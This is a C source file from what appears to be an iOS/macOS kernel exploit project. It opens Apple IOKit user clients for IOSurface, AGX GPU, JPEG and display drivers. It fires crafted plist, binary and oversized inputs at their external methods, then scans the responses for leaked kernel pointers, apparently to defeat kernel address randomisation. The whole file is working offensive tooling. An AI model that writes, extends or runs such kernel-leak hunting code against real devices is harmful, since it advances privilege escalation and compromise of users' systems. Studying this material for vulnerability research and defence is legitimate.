#include "exploit.h"
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>

#define IOSURFACE_CREATE_SEL    0
#define IOSURFACE_LOOKUP_SEL    1

static int craft_scan_kptrs(const uint8_t *buf, size_t n, const char *tag) {
    int found = 0;
    for (size_t off = 0; off + 8 <= n; off += 8) {
        uint64_t v;
        memcpy(&v, buf + off, 8);
        uint32_t hi = (uint32_t)(v >> 32);
        if ((hi == 0xfffffff0 || hi == 0xffffffe0 ||
             hi == 0xfffffe00 || hi == 0xffffff80) && v != 0) {
            nk_log("[io LEAK] %s off=0x%zx ptr=0x%016llx%s",
                   tag, off, (unsigned long long)v,
                   ((v & 0xFFFFULL) == 0) ? " (page-aligned)" : "");
            found++;
        }
    }
    return found;
}

static void build_iosurface_dict(uint8_t *buf, size_t *out_sz) {
    const char *xml =
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "<plist version=\"1.0\">\n"
        "<dict>\n"
        "  <key>IOSurfaceWidth</key>\n"
        "  <integer>64</integer>\n"
        "  <key>IOSurfaceHeight</key>\n"
        "  <integer>64</integer>\n"
        "  <key>IOSurfaceBytesPerRow</key>\n"
        "  <integer>256</integer>\n"
        "  <key>IOSurfaceBytesPerElement</key>\n"
        "  <integer>4</integer>\n"
        "  <key>IOSurfacePixelFormat</key>\n"
        "  <string>ARGB</string>\n"
        "  <key>IOSurfaceAllocSize</key>\n"
        "  <integer>16384</integer>\n"
        "</dict>\n"
        "</plist>\n";

    size_t len = strlen(xml);
    if (len > *out_sz) len = *out_sz;
    memcpy(buf, xml, len);
    *out_sz = len;
}

void nk_crafted_io_hunt(void) {
    nk_log("[io] crafted IOKit protocol hunt (IOSurface, AGX, JPEG, CLCD)");

    io_iterator_t it = 0;
    kern_return_t kr = IOServiceGetMatchingServices(
        kIOMasterPortDefault, IOServiceMatching("IOService"), &it);

    if (kr != KERN_SUCCESS || it == 0) {
        nk_log("[io] registry iterator failed");
        return;
    }

    static const char *targets[] = {
        "IOCoreSurfaceRoot",
        "AGXAcceleratorG14P",
        "AppleJPEGDriver",
        "AppleCLCD2",
        "AppleM2ScalerCSCDriver",
        NULL
    };

    int total_leaks = 0;

    io_service_t svc;
    while ((svc = IOIteratorNext(it)) != IO_OBJECT_NULL) {
        io_name_t name;
        if (IORegistryEntryGetName(svc, name) != KERN_SUCCESS) {
            IOObjectRelease(svc);
            continue;
        }

        int is_target = 0;
        for (int i = 0; targets[i]; i++) {
            if (strcmp(name, targets[i]) == 0) {
                is_target = 1;
                break;
            }
        }

        if (!is_target) {
            IOObjectRelease(svc);
            continue;
        }

        for (uint32_t type = 0; type < 4; type++) {
            io_connect_t conn = 0;
            if (IOServiceOpen(svc, mach_task_self(), type, &conn) != KERN_SUCCESS)
                continue;

            nk_log("[io] %s type=%u opened, probing crafted inputs", name, type);

            {
                static uint8_t in[4096];
                static uint8_t out[4096];
                size_t in_sz = sizeof(in);
                build_iosurface_dict(in, &in_sz);

                for (uint32_t sel = 0; sel < 16; sel++) {
                    size_t out_sz = sizeof(out);
                    memset(out, 0xBB, sizeof(out));

                    kern_return_t k2 = IOConnectCallStructMethod(
                        conn, sel, in, in_sz, out, &out_sz);
                    if (k2 != KERN_SUCCESS) continue;

                    int mut = 0;
                    for (size_t i = 0; i < out_sz; i++)
                        if (out[i] != 0xBB) mut++;
                    if (mut == 0) continue;

                    nk_log("[io RESP] %s t=%u sel=%u in=%zu(plist) out=%zu mut=%d",
                           name, type, sel, in_sz, out_sz, mut);

                    int leaks = craft_scan_kptrs(out, out_sz, name);
                    total_leaks += leaks;

                    if (sel == IOSURFACE_CREATE_SEL && out_sz >= 4) {
                        uint32_t surface_id = 0;
                        memcpy(&surface_id, out, 4);
                        if (surface_id != 0 && surface_id != 0xBBBBBBBB) {
                            nk_log("[io SURF] %s returned surface_id=%u (0x%x)",
                                   name, surface_id, surface_id);
                        }
                    }
                }
            }

            {
                static uint8_t in[256];
                static uint8_t out[4096];
                memset(in, 0, sizeof(in));

                uint32_t *p32 = (uint32_t *)in;
                p32[0] = 64;
                p32[1] = 64;
                p32[2] = 256;
                p32[3] = 4;
                p32[4] = 16384;
                p32[5] = 0x41524742;

                for (uint32_t sel = 0; sel < 16; sel++) {
                    size_t out_sz = sizeof(out);
                    memset(out, 0xBB, sizeof(out));

                    kern_return_t k2 = IOConnectCallStructMethod(
                        conn, sel, in, sizeof(in), out, &out_sz);
                    if (k2 != KERN_SUCCESS) continue;

                    int mut = 0;
                    for (size_t i = 0; i < out_sz; i++)
                        if (out[i] != 0xBB) mut++;
                    if (mut == 0) continue;

                    nk_log("[io RESP] %s t=%u sel=%u in=256(bin) out=%zu mut=%d",
                           name, type, sel, out_sz, mut);

                    int leaks = craft_scan_kptrs(out, out_sz, name);
                    total_leaks += leaks;
                }
            }

            {
                static uint8_t in[4096];
                static uint8_t out[4096];
                memset(in, 0x43, sizeof(in));

                static const size_t oob_sizes[] = { 257, 513, 1025, 2049, 4096 };

                for (uint32_t sel = 0; sel < 4; sel++) {
                    for (size_t si = 0; si < sizeof(oob_sizes) / sizeof(oob_sizes[0]); si++) {
                        size_t out_sz = sizeof(out);
                        memset(out, 0xBB, sizeof(out));

                        kern_return_t k2 = IOConnectCallStructMethod(
                            conn, sel, in, oob_sizes[si], out, &out_sz);
                        if (k2 != KERN_SUCCESS) continue;

                        int mut = 0;
                        for (size_t i = 0; i < out_sz; i++)
                            if (out[i] != 0xBB) mut++;
                        if (mut == 0) continue;

                        nk_log("[io OOB] %s t=%u sel=%u in=%zu out=%zu mut=%d",
                               name, type, sel, oob_sizes[si], out_sz, mut);

                        int leaks = craft_scan_kptrs(out, out_sz, name);
                        total_leaks += leaks;
                    }
                }
            }

            IOServiceClose(conn);
        }

        IOObjectRelease(svc);
    }

    IOObjectRelease(it);
    nk_log("[io] hunt done total_leaks=%d", total_leaks);
}
